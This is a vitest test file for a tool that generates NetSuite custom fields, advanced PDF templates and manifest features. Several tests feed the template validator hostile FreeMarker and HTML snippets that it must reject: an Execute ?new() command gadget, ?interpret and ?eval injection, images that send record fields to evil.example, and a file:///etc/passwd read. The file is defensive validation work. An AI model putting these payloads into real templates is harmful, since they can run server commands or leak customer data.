import { readFile } from "node:fs/promises";
import { describe, expect, it } from "vitest";
import { SELECT_RECORD_TYPES, SdfSpecError, fieldArtifact, templateArtifact, templateSourceIssues, withRequiredFeatures } from "../src";

const INVOICE_SOURCE = `<?xml version="1.0"?>
<!DOCTYPE pdf PUBLIC "-//big.faceless.org//report" "report-1.1.dtd">
<pdf>
  <head><style>th { background-color: #eeeeee; }</style></head>
  <body size="Letter">
    <h1>\${record.tranid}</h1>
    <table width="100%">
      <#list record.item as line>
        <tr><td>\${line.item}</td><td align="right">\${line.amount}</td></tr>
      </#list>
    </table>
  </body>
</pdf>`;

describe("fieldArtifact", () => {
  it("builds a body checkbox", async () => {
    const a = fieldArtifact({
      kind: "body",
      name: "rush",
      label: "Rush order",
      type: "CHECKBOX",
      appliesTo: ["sale"],
      help: "Tick when the order ships the same day.",
    });
    expect(a.scriptId).toBe("custbody_nsagent_rush");
    expect(a.features).toEqual([]);
    expect(a.files.map((f) => f.path)).toEqual(["fields/custbody_nsagent_rush.xml"]);
    await expect(a.files[0]!.content).toMatchFileSnapshot("golden/custbody_nsagent_rush.xml");
  });

  it("builds an entity select and an item text field, collecting features", async () => {
    const entity = fieldArtifact({
      kind: "entity",
      name: "account_manager",
      label: "Account manager",
      type: "SELECT",
      selectRecordType: "-4",
      appliesTo: ["customer", "partner"],
    });
    expect(entity.features).toEqual(["CRM"]);
    await expect(entity.files[0]!.content).toMatchFileSnapshot("golden/custentity_nsagent_account_manager.xml");

    const item = fieldArtifact({ kind: "item", name: "hazmat_class", label: "Hazmat class", type: "TEXT", appliesTo: ["inventory", "assembly"] });
    expect(item.features).toEqual(["ASSEMBLIES", "INVENTORY"]);
    await expect(item.files[0]!.content).toMatchFileSnapshot("golden/custitem_nsagent_hazmat_class.xml");
  });

  it("escapes text", () => {
    const a = fieldArtifact({ kind: "body", name: "note", label: `A <b> & "c"`, type: "TEXT", appliesTo: ["sale"] });
    expect(a.files[0]!.content).toContain("<label>A &#60;b&#62; &#38; &#34;c&#34;</label>");
  });

  it("allows names up to the script ID limit", () => {
    expect(fieldArtifact({ kind: "body", name: "a".repeat(21), label: "x", type: "TEXT", appliesTo: ["sale"] }).scriptId).toHaveLength(38);
    expect(fieldArtifact({ kind: "entity", name: "a".repeat(21), label: "x", type: "TEXT", appliesTo: ["customer"] }).scriptId).toHaveLength(40);
  });

  it.each([
    [{ name: "a".repeat(22) }, "at most 21 characters"],
    [{ name: "Rush" }, "lowercase"],
    [{ name: "rush__order" }, "single underscores"],
    [{ appliesTo: ["customer"] }, "body fields apply to"],
    [{ appliesTo: ["sale", "sale"] }, "duplicates"],
    [{ appliesTo: [] }, "appliesTo"],
    [{ type: "SELECT" }, "need selectRecordType"],
    [{ selectRecordType: "-2" }, "only for SELECT"],
    [{ type: "SELECT", selectRecordType: "customlist_x" }, "standard record type id"],
    [{ defaultChecked: true }, "only for CHECKBOX"],
    [{ type: "CHECKBOX", mandatory: true }, "cannot be mandatory"],
    [{ type: "PASSWORD" }, "type"],
    [{ type: "INLINEHTML" }, "type"],
    [{ extra: 1 }, "Unrecognized key"],
  ])("rejects %o", (patch, message) => {
    const spec = { kind: "body", name: "rush", label: "Rush", type: "TEXT", appliesTo: ["sale"], ...patch };
    expect(() => fieldArtifact(spec as never)).toThrow(SdfSpecError);
    expect(() => fieldArtifact(spec as never)).toThrow(message);
  });
});

describe("templateArtifact", () => {
  it("builds the object and the template file side by side", async () => {
    const a = templateArtifact({ record: "invoice", purpose: "standard", title: "NS Agent - Invoice", source: INVOICE_SOURCE });
    expect(a.scriptId).toBe("custtmpl_nsagent_invoice_standard");
    expect(a.features).toEqual(["ACCOUNTING", "ADVANCEDPRINTING"]);
    expect(a.files.map((f) => f.path)).toEqual([
      "templates/custtmpl_nsagent_invoice_standard.xml",
      "templates/custtmpl_nsagent_invoice_standard.template.xml",
    ]);
    await expect(a.files[0]!.content).toMatchFileSnapshot("golden/custtmpl_nsagent_invoice_standard.xml");
    expect(a.files[1]!.content).toBe(`${INVOICE_SOURCE}\n`);
  });

  it("is never preferred", () => {
    const a = templateArtifact({ record: "salesorder", purpose: "pick", title: "Pick list", source: INVOICE_SOURCE });
    expect(a.files[0]!.content).toContain("<preferred>F</preferred>");
    expect(a.files[0]!.content).toContain('standard="STDTMPLSALESORD"');
    expect(() => templateArtifact({ record: "salesorder", purpose: "pick", title: "Pick list", source: INVOICE_SOURCE, preferred: true } as never)).toThrow(
      "Unrecognized key",
    );
  });

  it.each([
    [{ record: "customer" }, "record"],
    [{ purpose: "Standard" }, "lowercase"],
    [{ title: "x" }, "title"],
    [{ source: "<pdf></pdf>" }, "must start with <?xml"],
    [{ source: '<?xml version="1.0"?><pdf></pdf>' }, "DOCTYPE"],
    [{ source: INVOICE_SOURCE.replace("<#list", '<#include "x.ftl"><#list') }, "not allowed"],
    [{ source: INVOICE_SOURCE + " ".repeat(200_000) }, "source"],
  ])("rejects %o", (patch, message) => {
    const spec = { record: "invoice", purpose: "standard", title: "NS Agent - Invoice", source: INVOICE_SOURCE, ...patch };
    expect(() => templateArtifact(spec as never)).toThrow(SdfSpecError);
    expect(() => templateArtifact(spec as never)).toThrow(message);
  });
});

describe("acceptance loop attempt 2 fixes", () => {
  const base = { kind: "body", name: "rush", label: "Rush", type: "TEXT", appliesTo: ["sale"] };

  it("takes selectRecordType only from the SDF list and adds its feature", () => {
    const crm = fieldArtifact({ ...base, type: "SELECT", selectRecordType: "-5" } as never);
    expect(crm.features).toEqual(["CRM"]);
    expect(fieldArtifact({ ...base, type: "SELECT", selectRecordType: "-2" } as never).features).toEqual([]);
    expect(() => fieldArtifact({ ...base, type: "SELECT", selectRecordType: "-1" } as never)).toThrow("SDF list");
    expect(() => fieldArtifact({ ...base, type: "SELECT", selectRecordType: "-11" } as never)).toThrow("SDF list");
  });

  it.each(["constructor", "toString", "__proto__", "hasOwnProperty"])("rejects the inherited key %s as an applies-to target", (key) => {
    expect(() => fieldArtifact({ ...base, appliesTo: [key] } as never)).toThrow("body fields apply to");
  });

  it.each([
    [{ label: "Rush\u0007" }, "control characters"],
    [{ help: "bad \u0000 help" }, "control characters"],
    [{ description: "x\u001F" }, "control characters"],
    [{ label: "[scriptid=custbody_x]" }, 'must not start with "["'],
    [{ help: " [scriptid=x]" }, 'must not start with "["'],
  ])("rejects unsafe text %o", (patch, message) => {
    expect(() => fieldArtifact({ ...base, ...patch } as never)).toThrow(message);
  });

  it.each([
    ['[#include "x.ftl"]', "include"],
    ['<#assign t = "<#" + "include x>"><@t?interpret/>', "?interpret"],
    ['${"1+1"?eval}', "?eval"],
    ['<#assign x = "freemarker.template.utility.Execute"?new()>', "?new"],
    ['<img src="https://example.com/x?d=${record.entity}"/>', "src, href or url()"],
    ["<div style=\"background: url('https://example.com/${record.total}')\"/>", "src, href or url()"],
  ])("rejects template source %s", (snippet, message) => {
    const source = INVOICE_SOURCE.replace("<table", `${snippet}<table`);
    expect(() => templateArtifact({ record: "invoice", purpose: "standard", title: "NS Agent - Invoice", source })).toThrow(message);
  });

  it("allows a fixed image URL", () => {
    const source = INVOICE_SOURCE.replace("<table", '<img src="https://system.netsuite.com/core/media/media.nl?id=1"/><table');
    expect(() => templateArtifact({ record: "invoice", purpose: "standard", title: "NS Agent - Invoice", source })).not.toThrow();
  });
});

describe("acceptance loop attempt 3 fixes", () => {
  const base = { kind: "body", name: "rush", label: "Rush", type: "TEXT", appliesTo: ["sale"] };
  const withSnippet = (snippet: string) => INVOICE_SOURCE.replace("<table", `${snippet}<table`);

  it.each([
    ["a quote inside a double-quoted URL", `<img src="https://system.netsuite.com/a'\${record.entity}"/>`, "FreeMarker inside"],
    ["a macro called inside the URL", '<#macro d>${record.entity}</#macro><img src="https://system.netsuite.com/?d=<@d/>"/>', "FreeMarker inside"],
    ["an unquoted value with built quotes", `<img src=\${'"'}https://system.netsuite.com/\${record.entity}\${'"'}/>`, "quoted value"],
    ["numeric interpolation", '<img src="https://system.netsuite.com/?t=#{record.total}"/>', "FreeMarker inside"],
    ["a record field as the whole URL", '<img src="${record.custbody_url}"/>', "FreeMarker inside"],
    ["a comment between ? and the built-in", '<#assign t = "x"><@t?<#-- c -->interpret/>', "?interpret"],
    ["CSS @import", '<style>@import "https://system.netsuite.com/x.css";</style>', "@import"],
    ["a literal outside host", '<img src="https://evil.example/logo.png"/>', "only NetSuite addresses"],
    ["a protocol-relative outside host", '<img src="//evil.example/logo.png"/>', "only NetSuite addresses"],
    ["an outside host built into a string", `<#assign u = "https://evil.example/" + record.entity>`, "only NetSuite addresses"],
    ["a file: address", '<img src="file:///etc/passwd"/>', "file: and ftp:"],
  ])("rejects %s", (_name, snippet, message) => {
    expect(() => templateArtifact({ record: "invoice", purpose: "standard", title: "NS Agent - Invoice", source: withSnippet(snippet) })).toThrow(message);
  });

  it("allows NetSuite fonts and the company logo, the way standard templates load them", () => {
    const source = withSnippet('<link name="NotoSans" type="font" src="${nsfont.NotoSans_Regular}"/><img src="${companyInformation.logoUrl}"/>');
    expect(templateSourceIssues(source)).toEqual([]);
  });

  it("flags only the record-driven URL in a real template from the demo account", async () => {
    // test/fixtures/imported-invoice.template.xml: the .template.xml of custtmpl_bpc_inv_w_attach, imported from TSTDRV1755417.
    const real = await readFile(new URL("fixtures/imported-invoice.template.xml", import.meta.url), "utf8");
    expect(templateSourceIssues(real)).toEqual([
      "FreeMarker inside a src, href or url() value is not allowed (${record.custbody_bpc_pdf_attach_url}): the renderer would fetch that address",
    ]);
  });

  it("rejects U+FFFE and U+FFFF in text", () => {
    expect(() => fieldArtifact({ ...base, label: "x￾y" } as never)).toThrow("control characters");
    expect(() => fieldArtifact({ ...base, help: "x￿" } as never)).toThrow("control characters");
  });

  it("knows the MULTIBOOKV2 select types the first extraction missed", () => {
    expect(SELECT_RECORD_TYPES["-252"]).toBe("MULTIBOOKV2");
    expect(fieldArtifact({ ...base, type: "SELECT", selectRecordType: "-259" } as never).features).toEqual(["MULTIBOOKV2"]);
    expect(Object.keys(SELECT_RECORD_TYPES)).toHaveLength(439);
  });

  it("writes only elements a template exported from the demo account also has", async () => {
    // test/fixtures/imported-advancedpdftemplate.xml: `suitecloud object:import` of custtmpl_bpc_inv_w_attach from TSTDRV1755417.
    const imported = await readFile(new URL("fixtures/imported-advancedpdftemplate.xml", import.meta.url), "utf8");
    const tags = (xml: string) => new Set([...xml.matchAll(/^\s*<([a-z]+)>/gm)].map((m) => m[1]));
    const generated = templateArtifact({ record: "invoice", purpose: "standard", title: "NS Agent - Invoice", source: INVOICE_SOURCE });
    const ours = tags(generated.files[0]!.content);
    expect([...ours].filter((t) => !tags(imported).has(t))).toEqual([]);
    expect(ours).toContain("printtype");
    expect(ours).toContain("trantype");
    expect(imported).toContain('standard="STDTMPLCUSTINVC"');
  });
});

describe("withRequiredFeatures", () => {
  const MANIFEST = `<manifest projecttype="ACCOUNTCUSTOMIZATION">
  <dependencies>
    <features>
      <feature required="true">SERVERSIDESCRIPTING</feature>
      <feature required="false">CRM</feature>
    </features>
  </dependencies>
</manifest>`;

  it("adds missing features and promotes optional ones", () => {
    expect(withRequiredFeatures(MANIFEST, ["CRM", "ADVANCEDPRINTING", "SERVERSIDESCRIPTING"])).toBe(`<manifest projecttype="ACCOUNTCUSTOMIZATION">
  <dependencies>
    <features>
      <feature required="true">SERVERSIDESCRIPTING</feature>
      <feature required="true">CRM</feature>
      <feature required="true">ADVANCEDPRINTING</feature>
    </features>
  </dependencies>
</manifest>`);
  });

  it("leaves a manifest that already has everything untouched", () => {
    expect(withRequiredFeatures(MANIFEST, ["SERVERSIDESCRIPTING"])).toBe(MANIFEST);
  });

  it("rejects bad input", () => {
    expect(() => withRequiredFeatures("<manifest/>", ["CRM"])).toThrow("no <features> block");
    expect(() => withRequiredFeatures(MANIFEST, ["crm</feature>"])).toThrow("invalid feature id");
  });
});
